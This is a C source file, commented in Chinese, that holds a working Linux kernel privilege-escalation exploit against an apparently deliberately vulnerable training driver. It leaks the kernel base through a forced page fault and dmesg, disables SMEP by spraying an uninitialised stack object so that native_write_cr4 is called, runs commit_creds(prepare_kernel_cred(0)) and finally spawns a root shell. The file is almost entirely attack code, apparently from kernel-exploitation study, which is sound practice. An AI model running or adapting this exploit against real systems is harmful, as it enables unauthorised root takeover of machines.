#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM,0)
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"

// stack 对象
struct stack_obj
{
	int do_callback;
	size_t fn_arg;
	void (*fn)(long);
};
struct use_obj_args
{
	int option;
	size_t fn_arg;
};


//让程序只在单核上运行，以免只关闭了1个核的smep，却在另1个核上跑shell
void force_single_core()
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(0,&mask);

	if (sched_setaffinity(0,sizeof(mask),&mask))
		printf("[-----] Error setting affinity to core0, continue anyway, exploit may fault \n");
	return;
}

// 触发page_fault 泄露kernel基址
void do_page_fault()
{
	struct use_obj_args use_obj =
	{
		.option=1,
		.fn_arg=1337,
	};
	int child_fd=open(PATH, O_RDWR);
	ioctl(child_fd, UNINITIALISED_STACK_USE, &use_obj);
	return ;
}

//从dmesg读取打印信息，泄露kernel基址
#define GREP_INFOLEAK "dmesg | grep SyS_ioctl+0x79 | awk '{print $3}' | cut -d '<' -f 2 | cut -d '>' -f 1 > /tmp/infoleak"
size_t get_info_leak()
{
	system(GREP_INFOLEAK);
	size_t addr=0;
	FILE *fd=fopen("/tmp/infoleak","r");
	fscanf(fd,"%lx",&addr);
	fclose(fd);
	return addr;
}

size_t prepare_kernel_cred_addr=0xa6ca0;
size_t commit_creds_addr=0xa68b0;
size_t native_write_cr4_addr=0x65a30;
size_t sys_ioctl_offset=0x22bc59;
size_t fake_cr4=0x407f0;

void get_root()
{
	char* (*pkc)(int) = prepare_kernel_cred_addr;
	void (*cc)(char*) = commit_creds_addr;
	(*cc)((*pkc)(0));
}

int main()
{
	// step 1: 只允许在单核上运行
	force_single_core();

	int fd = open("/dev/vulnerable_device", O_RDWR);
	if (fd<0){
		printf("[-] Open error!\n");
		return 0;
	}
	ioctl(fd,DRIVER_TEST,NULL);  //用于标识dmesg中字符串的开始

	// step 2: 构造 page_fault 泄露kernel地址。从dmesg读取后写到/tmp/infoleak，再读出来
	pid_t pid=fork();
	if (pid==0){
		do_page_fault();
		exit(0);
	}
	int status;
	wait(&status);    // 等子进程结束
	//sleep(10);
	printf("[+] Begin to leak address by dmesg![+]\n");
	size_t kernel_base = get_info_leak()-sys_ioctl_offset;
	printf("[+] Kernel base addr : %p [+] \n", kernel_base);

	native_write_cr4_addr+=kernel_base;
	prepare_kernel_cred_addr+=kernel_base;
	commit_creds_addr+=kernel_base;
	printf("[+] We can get 3 important function address ![+]\n");
	printf("        native_write_cr4_addr = %p\n",native_write_cr4_addr);
	printf("        prepare_kernel_cred_addr = %p\n",prepare_kernel_cred_addr);
	printf("        commit_creds_addr = %p\n",commit_creds_addr);

	// step 3: 关闭smep
	char buf[4096];
	memset(buf, 0, sizeof(buf));
	struct use_obj_args use_obj={
		.option=1,
		.fn_arg=1337,
	};

	for (int i=0; i<4096; i+=16)
	{
		memcpy(buf+i, &fake_cr4, 8);   // 注意是fake_cr4所在地址
		memcpy(buf+i+8, &native_write_cr4_addr, 8);  // 注意是native_write_cr4_addr所在地址
	}
	ioctl(fd,UNINITIALISED_STACK_ALLOC, buf);
	ioctl(fd,UNINITIALISED_STACK_USE, &use_obj);

	// step 4: 提权，执行get_root();  注意是把get_root()的地址拷贝过去，转一次
	size_t get_root_addr = &get_root;
	memset(buf, 0, sizeof(buf));
	for (int i=0; i<4096; i+=8)
		memcpy(buf+i, &get_root_addr, 8);

	ioctl(fd,UNINITIALISED_STACK_ALLOC, buf);
	ioctl(fd,UNINITIALISED_STACK_USE, &use_obj);

	// step 5: 获得shell
	if (getuid()==0)
	{
		printf("[+] Congratulations! You get root shell !!! [+]\n");
		system("/bin/sh");
	}

	close(fd);
	return 0;
}
/*
use_stack_obj()
UNINITIALISED_STACK_USE=0x8008fe0d
.text:0000000000000023                 mov     rax, [rbp-38h]
.text:0000000000000027                 mov     use_obj_arg, [rbp-40h]
.text:000000000000002B                 call    __x86_indirect_thunk_rax

$ cat /sys/module/vuln_driver/sections/.text

*/
